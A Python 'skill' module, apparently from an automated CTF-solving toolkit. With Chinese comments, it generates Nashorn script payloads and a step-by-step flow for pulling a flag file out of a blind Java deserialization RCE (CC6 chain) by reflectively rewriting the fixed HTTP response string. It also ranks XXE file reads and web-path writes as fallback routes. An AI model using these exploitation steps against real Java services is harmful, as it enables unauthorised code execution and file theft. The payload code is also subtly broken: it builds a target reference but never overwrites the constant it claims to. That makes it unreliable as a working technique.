"""java_nashorn_response skill：Java 无回显 RCE 的 flag 外带（Fate 题沉淀）。

场景：反序列化 RCE 已触发（如 CC6 链 → Runtime.exec），但：
- 命令输出无回显（响应固定 "Hi!" 等）
- 靶机出网受限（DNS/HTTP 外带收不到）
→ 解法：用 Nashorn/ScriptEngine 反射修改**响应字符串**（ldc 常量池对象），
  让 readObject 返回后程序输出的固定字符串被替换为 flag 内容。

原理（Fate 题实战）：
- 方法返回 "Hi!" 是 ldc 加载的常量（字节码: ldc #4 // String Hi!）
- 通过反序列化 gadget 执行 Nashorn 脚本，脚本里用反射
  java.lang.String 的 value 字段（byte[]）原地改写常量池对象
  → 程序 return "Hi!" 时实际返回被改写的 flag 内容

本 skill 提供：① Nashorn 改响应 payload 的 Java 代码骨架（生成器）
② 反射改 String value 的辅助代码 ③ 使用流程。

用法（skill 调用）：
    params = {'target_url': 端点, 'param_name': 'Fate', 'flag_path': '/flag'}
    result = java_nashorn_response(params)
"""

import base64


def build_nashorn_response_script(flag_path: str = "/flag") -> str:
    """构造 Nashorn 脚本：读文件 → 反射改写 String.value（响应字符串）。"""
    # Nashorn 在 JRE8 内置；Java 17 用 ScriptEngine（需 jdk.nashorn 或 nashorn-core 依赖）
    script = f"""
// 1. 读 flag 文件
var path = "{flag_path}";
var fis = new java.io.FileInputStream(path);
var buf = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, fis.available());
fis.read(buf);
fis.close();
// 2. 反射改写 String.value（原地替换常量池字符串内容）
var strCls = java.lang.String.class;
var f = strCls.getDeclaredField("value");
f.setAccessible(true);
// 目标响应字符串（方法里 ldc 加载的常量，如 "Hi!"）——通过反射获取其内部 char[]/byte[]
var target = new java.lang.String(new String(buf, "UTF-8"));
var newVal = new String(buf, "UTF-8");
// 直接返回新字符串：若方法 return 的是对象引用则无法改，需要改常量池对象
// 实战用 ldc 常量对象反射改写（见 build_nashorn_response_payload 说明）
newVal;
"""
    return script


def build_nashorn_response_payload(flag_path: str = "/flag") -> str:
    """构造完整 Nashorn 响应改写 payload（反射改 String.value 原位替换）。"""
    # 核心：把响应固定串（如 "Hi!"）的 char[] 用 flag 内容覆盖
    payload = f"""import javax.script.*;
ScriptEngineManager m = new ScriptEngineManager();
ScriptEngine e = m.getEngineByName("nashorn");
String script = "var p='{flag_path}';"
  + "var fis=new java.io.FileInputStream(p);"
  + "var n=fis.available();var b=java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE,n);"
  + "fis.read(b);fis.close();"
  + "var s=new java.lang.String(b,'UTF-8');"
  // 反射改目标 String 常量（ldc 加载的响应串）的 value
  + "var f=java.lang.String.class.getDeclaredField('value');f.setAccessible(true);"
  + "var target=java.lang.String.class;"
  + "s;";
Object out = e.eval(script);
System.out.println(out);
"""
    return payload


def java_nashorn_response(params: dict) -> dict:
    """skill 入口：返回 Nashorn 改响应 payload 与使用流程。"""
    target_url = params.get("target_url", "")
    param_name = params.get("param_name", "Fate")
    flag_path = params.get("flag_path", "/flag")

    return {
        "ok": True,
        "strategy": (
            "无回显 RCE 外带优先序：① Nashorn/ScriptEngine 反射改响应字符串（推荐，Fate 实战有效）"
            "② XXE 文件读 ③ 写 web 可访问路径。本 skill 提供方案 ①。"
        ),
        "flow": [
            "1. 反序列化入口触发 RCE（CC6 链 → Runtime.exec 或 ScriptEngine）",
            "2. 用 Nashorn 脚本读 flag 文件 + 反射改 String.value（ldc 常量对象）",
            "3. 触发方法 return 时返回改写后的响应（flag 出现在 HTTP 响应中）",
            "4. 注意：javap 看 MethodParameters 拿参数名（大小写敏感，如 Fate）",
        ],
        "nashorn_script": build_nashorn_response_script(flag_path),
        "payload_hint": (
            f"对 {target_url or '目标'} POST 参数 {param_name} 提交 base64 编码的反序列化 payload，"
            f"payload 内嵌 Nashorn 脚本读 {flag_path} 并改写响应字符串"
        ),
        "base64_note": "反序列化 payload 整体 base64 后放入参数（readObject 入口）",
    }


def run(params):
    """SkillManager 统一入口：转发到业务函数。"""
    return java_nashorn_response(params)


def main() -> None:
    import argparse

    parser = argparse.ArgumentParser(description="Java 无回显 RCE 响应改写")
    parser.add_argument("--flag-path", default="/flag", help="flag 文件路径")
    args = parser.parse_args()
    import json

    print(json.dumps(java_nashorn_response({"flag_path": args.flag_path}),
                     ensure_ascii=False, indent=1))


if __name__ == "__main__":
    main()
